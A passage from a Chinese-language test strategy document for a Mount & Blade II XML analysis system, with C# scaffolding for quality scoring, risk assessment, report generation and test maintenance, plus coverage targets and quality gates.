        await GenerateVisualReportAsync(report);
        
        return report;
    }
    
    private QualityMetrics CalculateQualityMetrics(TestExecutionResult executionResult)
    {
        var metrics = new QualityMetrics
        {
            OverallQualityScore = CalculateOverallQualityScore(executionResult),
            TestReliability = CalculateTestReliability(executionResult),
            CodeQuality = CalculateCodeQuality(executionResult),
            PerformanceQuality = CalculatePerformanceQuality(executionResult),
            SecurityQuality = CalculateSecurityQuality(executionResult),
            MaintainabilityScore = CalculateMaintainabilityScore(executionResult)
        };
        
        return metrics;
    }
    
    private double CalculateOverallQualityScore(TestExecutionResult executionResult)
    {
        if (executionResult.PhaseResults.Count == 0)
        {
            return 0;
        }
        
        var weights = new Dictionary<string, double>
        {
            ["Unit Testing Phase"] = 0.30,
            ["Integration Testing Phase"] = 0.25,
            ["E2E Testing Phase"] = 0.15,
            ["Performance Testing Phase"] = 0.10,
            ["Security Testing Phase"] = 0.15,
            ["Compatibility Testing Phase"] = 0.05
        };
        
        var weightedScore = 0.0;
        
        foreach (var phaseResult in executionResult.PhaseResults)
        {
            if (weights.TryGetValue(phaseResult.PhaseName, out var weight))
            {
                var phaseScore = CalculatePhaseQualityScore(phaseResult);
                weightedScore += phaseScore * weight;
            }
        }
        
        return Math.Round(weightedScore, 2);
    }
    
    private double CalculatePhaseQualityScore(TestPhaseResult phaseResult)
    {
        if (phaseResult.TotalTests == 0)
        {
            return 0;
        }
        
        var passRate = (double)phaseResult.PassedTests / phaseResult.TotalTests;
        var coverageScore = Math.Min(phaseResult.CoveragePercentage / 100, 1.0);
        var performanceScore = CalculatePerformanceScore(phaseResult);
        
        // 综合评分：通过率40%，覆盖率30%，性能30%
        var overallScore = (passRate * 0.4) + (coverageScore * 0.3) + (performanceScore * 0.3);
        
        return Math.Round(overallScore * 100, 2);
    }
    
    private double CalculatePerformanceScore(TestPhaseResult phaseResult)
    {
        if (phaseResult.TestResults.Count == 0)
        {
            return 0;
        }
        
        var averageExecutionTime = phaseResult.TestResults
            .Where(r => r.Status == TestStatus.Passed)
            .Average(r => r.ExecutionTimeMs);
        
        // 性能评分：执行时间越短，分数越高
        var maxAcceptableTime = 5000; // 5秒
        var score = Math.Max(0, 1 - (averageExecutionTime / maxAcceptableTime));
        
        return Math.Round(score * 100, 2);
    }
    
    private CoverageAnalysis AnalyzeCoverage(TestExecutionResult executionResult)
    {
        var analysis = new CoverageAnalysis
        {
            OverallCoverage = CalculateOverallCoverage(executionResult),
            CoverageByPhase = executionResult.PhaseResults
                .ToDictionary(r => r.PhaseName, r => r.CoveragePercentage),
            CoverageTrends = CalculateCoverageTrends(executionResult),
            CoverageRecommendations = GenerateCoverageRecommendations(executionResult)
        };
        
        return analysis;
    }
    
    private PerformanceAnalysis AnalyzePerformance(TestExecutionResult executionResult)
    {
        var analysis = new PerformanceAnalysis
        {
            OverallPerformance = CalculateOverallPerformance(executionResult),
            PerformanceByPhase = executionResult.PhaseResults
                .ToDictionary(r => r.PhaseName, r => CalculatePhasePerformance(r)),
            PerformanceBottlenecks = IdentifyPerformanceBottlenecks(executionResult),
            PerformanceRecommendations = GeneratePerformanceRecommendations(executionResult)
        };
        
        return analysis;
    }
    
    private SecurityAssessment AssessSecurity(TestExecutionResult executionResult)
    {
        var securityPhase = executionResult.PhaseResults
            .FirstOrDefault(r => r.PhaseName == "Security Testing Phase");
        
        if (securityPhase == null)
        {
            return new SecurityAssessment
            {
                OverallSecurityScore = 0,
                SecurityStatus = SecurityStatus.NotAssessed,
                VulnerabilitiesFound = 0,
                CriticalVulnerabilities = 0,
                SecurityRecommendations = new List<string> { "Security testing not performed" }
            };
        }
        
        var assessment = new SecurityAssessment
        {
            OverallSecurityScore = CalculatePhaseQualityScore(securityPhase),
            SecurityStatus = DetermineSecurityStatus(securityPhase),
            VulnerabilitiesFound = CountVulnerabilities(securityPhase),
            CriticalVulnerabilities = CountCriticalVulnerabilities(securityPhase),
            SecurityRecommendations = GenerateSecurityRecommendations(securityPhase)
        };
        
        return assessment;
    }
    
    private List<string> GenerateRecommendations(TestExecutionResult executionResult)
    {
        var recommendations = new List<string>();
        
        // 基于覆盖率的建议
        var overallCoverage = CalculateOverallCoverage(executionResult);
        if (overallCoverage < 95)
        {
            recommendations.Add($"Increase test coverage from {overallCoverage}% to at least 95%");
        }
        
        // 基于失败率的建议
        var overallFailureRate = CalculateOverallFailureRate(executionResult);
        if (overallFailureRate > 0.05)
        {
            recommendations.Add($"Reduce test failure rate from {overallFailureRate:P2} to below 5%");
        }
        
        // 基于性能的建议
        var performanceIssues = IdentifyPerformanceBottlenecks(executionResult);
        if (performanceIssues.Count > 0)
        {
            recommendations.Add($"Address performance bottlenecks: {string.Join(", ", performanceIssues)}");
        }
        
        // 基于安全的建议
        var securityAssessment = AssessSecurity(executionResult);
        if (securityAssessment.CriticalVulnerabilities > 0)
        {
            recommendations.Add($"Fix {securityAssessment.CriticalVulnerabilities} critical security vulnerabilities");
        }
        
        return recommendations;
    }
    
    private RiskAssessment AssessRisks(TestExecutionResult executionResult)
    {
        var risks = new List<RiskItem>();
        
        // 技术风险
        if (CalculateOverallCoverage(executionResult) < 90)
        {
            risks.Add(new RiskItem
            {
                Category = RiskCategory.Technical,
                Severity = RiskSeverity.High,
                Description = "Insufficient test coverage may lead to undetected bugs",
                Recommendation = "Increase test coverage to at least 90%"
            });
        }
        
        // 性能风险
        var performanceIssues = IdentifyPerformanceBottlenecks(executionResult);
        if (performanceIssues.Count > 2)
        {
            risks.Add(new RiskItem
            {
                Category = RiskCategory.Performance,
                Severity = RiskSeverity.Medium,
                Description = "Multiple performance bottlenecks detected",
                Recommendation = "Optimize performance-critical components"
            });
        }
        
        // 安全风险
        var securityAssessment = AssessSecurity(executionResult);
        if (securityAssessment.CriticalVulnerabilities > 0)
        {
            risks.Add(new RiskItem
            {
                Category = RiskCategory.Security,
                Severity = RiskSeverity.Critical,
                Description = "Critical security vulnerabilities found",
                Recommendation = "Fix all critical security issues before release"
            });
        }
        
        return new RiskAssessment
        {
            OverallRiskLevel = CalculateOverallRiskLevel(risks),
            RiskItems = risks,
            MitigationPlan = GenerateMitigationPlan(risks)
        };
    }
    
    private async Task GenerateVisualReportAsync(QualityReport report)
    {
        // 生成HTML格式的可视化报告
        var htmlReport = GenerateHtmlReport(report);
        
        // 生成PDF格式的报告
        var pdfReport = GeneratePdfReport(report);
        
        // 生成JSON格式的报告数据
        var jsonReport = System.Text.Json.JsonSerializer.Serialize(report, new System.Text.Json.JsonSerializerOptions
        {
            WriteIndented = true
        });
        
        // 保存报告文件
        await File.WriteAllTextAsync("quality-report.html", htmlReport);
        await File.WriteAllTextAsync("quality-report.pdf", pdfReport);
        await File.WriteAllTextAsync("quality-report.json", jsonReport);
    }
}
```

## 10. 测试覆盖率和质量目标

### 10.1 覆盖率目标

```
测试覆盖率目标：

1. 代码覆盖率：
   - 整体覆盖率：≥ 95%
   - 核心业务逻辑：≥ 98%
   - XML处理层：≥ 96%
   - 服务层：≥ 94%
   - 数据访问层：≥ 92%

2. 分支覆盖率：
   - 整体分支覆盖率：≥ 90%
   - 关键分支：≥ 95%

3. 测试类型覆盖率：
   - 单元测试：70%
   - 集成测试：15%
   - 端到端测试：5%
   - 性能测试：5%
   - 安全测试：5%
```

### 10.2 质量门禁

```
质量门禁标准：

1. 必须通过的标准：
   - 所有测试必须通过
   - 代码覆盖率 ≥ 95%
   - 无严重安全漏洞
   - 性能测试通过
   - 无内存泄漏

2. 警告级别的标准：
   - 代码覆盖率 < 98%
   - 存在中等级别安全漏洞
   - 性能测试结果接近阈值
   - 存在测试不稳定情况

3. 失败级别的标准：
   - 代码覆盖率 < 95%
   - 存在严重安全漏洞
   - 性能测试失败
   - 关键测试失败
   - 存在内存泄漏
```

## 11. 测试维护和持续改进

### 11.1 测试维护策略

```csharp
// 测试维护策略文件路径: docs/testing/TestMaintenanceStrategy.cs
public class TestMaintenanceStrategy
{
    public async Task MaintainTestSuiteAsync()
    {
        // 1. 定期清理过时的测试
        await CleanupObsoleteTestsAsync();
        
        // 2. 更新测试数据
        await UpdateTestDataAsync();
        
        // 3. 优化测试性能
        await OptimizeTestPerformanceAsync();
        
        // 4. 增强测试覆盖率
        await ImproveTestCoverageAsync();
        
        // 5. 修复不稳定测试
        await FixFlakyTestsAsync();
    }
    
    private async Task CleanupObsoleteTestsAsync()
    {
        var obsoleteTests = await IdentifyObsoleteTestsAsync();
        
        foreach (var obsoleteTest in obsoleteTests)
        {
            // 标记为过时，但不立即删除
            await MarkTestAsObsoleteAsync(obsoleteTest);
            
            // 记录清理原因
            await LogTestCleanupReasonAsync(obsoleteTest);
        }
    }
    
    private async Task UpdateTestDataAsync()
    {
        // 更新测试数据以反映最新的XML格式
        var testDataFiles = Directory.GetFiles("TestData", "*.xml", SearchOption.AllDirectories);
        
        foreach (var testDataFile in testDataFiles)
        {
            if (await IsTestDataOutdatedAsync(testDataFile))
            {
                await UpdateTestDataFileAsync(testDataFile);
            }
        }
    }
    
    private async Task OptimizeTestPerformanceAsync()
    {
        var slowTests = await IdentifySlowTestsAsync();
        
        foreach (var slowTest in slowTests)
        {
            // 分析性能瓶颈
            var bottlenecks = await AnalyzeTestPerformanceAsync(slowTest);
            
            // 优化测试
            await OptimizeTestAsync(slowTest, bottlenecks);
        }
    }
    
    private async Task ImproveTestCoverageAsync()
    {
        var coverageReport = await GenerateCoverageReportAsync();
        var uncoveredCode = await IdentifyUncoveredCodeAsync(coverageReport);
        
        foreach (var uncoveredMethod in uncoveredCode)
        {
            // 生成测试建议
            var testSuggestion = await GenerateTestSuggestionAsync(uncoveredMethod);
            
            // 创建新测试
            await CreateNewTestAsync(testSuggestion);
        }
    }
    
    private async Task FixFlakyTestsAsync()
    {
        var flakyTests = await IdentifyFlakyTestsAsync();
        
        foreach (var flakyTest in flakyTests)
        {
            // 分析不稳定性原因
            var instabilityReason = await AnalyzeTestInstabilityAsync(flakyTest);
            
            // 修复测试
            await FixTestInstabilityAsync(flakyTest, instabilityReason);
        }
    }
}
```

### 11.2 持续改进流程

```csharp
// 持续改进流程文件路径: docs/testing/ContinuousImprovementProcess.cs
public class ContinuousImprovementProcess
{
    public async Task ExecuteContinuousImprovementAsync()
    {
        // 1. 收集测试执行数据
        var executionData = await CollectTestExecutionDataAsync();
        
        // 2. 分析测试效果
        var analysis = await AnalyzeTestEffectivenessAsync(executionData);
        
        // 3. 识别改进机会
        var improvements = await IdentifyImprovementOpportunitiesAsync(analysis);
        
        // 4. 实施改进措施
        await ImplementImprovementsAsync(improvements);
        
        // 5. 验证改进效果
        var validation = await ValidateImprovementsAsync(improvements);
        
        // 6. 记录改进结果
        await RecordImprovementResultsAsync(validation);
    }
    
    private async Task<TestEffectivenessAnalysis> AnalyzeTestEffectivenessAsync(TestExecutionData executionData)
    {
        var analysis = new TestEffectivenessAnalysis
        {
            BugDetectionRate = CalculateBugDetectionRate(executionData),
            FalsePositiveRate = CalculateFalsePositiveRate(executionData),
            TestExecutionTime = CalculateAverageExecutionTime(executionData),
            TestReliability = CalculateTestReliability(executionData),
            MaintenanceCost = CalculateMaintenanceCost(executionData)
        };
        
        return analysis;
    }
    
    private async Task<List<ImprovementOpportunity>> IdentifyImprovementOpportunitiesAsync(TestEffectivenessAnalysis analysis)
    {
        var opportunities = new List<ImprovementOpportunity>();
        
        // 基于缺陷检测率的改进机会
        if (analysis.BugDetectionRate < 0.8)
        {
            opportunities.Add(new ImprovementOpportunity
            {
                Category = ImprovementCategory.TestCoverage,
                Priority = ImprovementPriority.High,
                Description = "Low bug detection rate indicates need for better test coverage",
                Recommendation = "Add more edge case tests and integration tests"
            });
        }
        
        // 基于误报率的改进机会
        if (analysis.FalsePositiveRate > 0.1)
        {
            opportunities.Add(new ImprovementOpportunity
            {
                Category = ImprovementCategory.TestReliability,
                Priority = ImprovementPriority.Medium,
                Description = "High false positive rate affects test reliability",
                Recommendation = "Review and fix flaky tests"
            });
        }
        
        // 基于执行时间的改进机会
        if (analysis.TestExecutionTime > 30000) // 30秒
        {
            opportunities.Add(new ImprovementOpportunity
            {
                Category = ImprovementCategory.Performance,
                Priority = ImprovementPriority.Medium,
                Description = "Slow test execution affects development velocity",
                Recommendation = "Optimize test performance and parallelize execution"
            });
        }
        
        return opportunities;
    }
}
```

## 12. 总结

本测试套件为骑马与砍杀2游戏XML格式分析系统提供了全面的测试策略，包括：

1. **全面的测试覆盖**：覆盖率达到95%以上
2. **多层次测试架构**：单元测试、集成测试、端到端测试、性能测试、安全测试
3. **自动化测试框架**：支持CI/CD集成和持续测试
4. **质量评估体系**：包含详细的质量指标和评估标准
5. **维护和改进策略**：确保测试套件的长期有效性

通过实施这套测试策略，可以确保系统的质量、可靠性和性能，同时支持持续集成和持续开发的需求。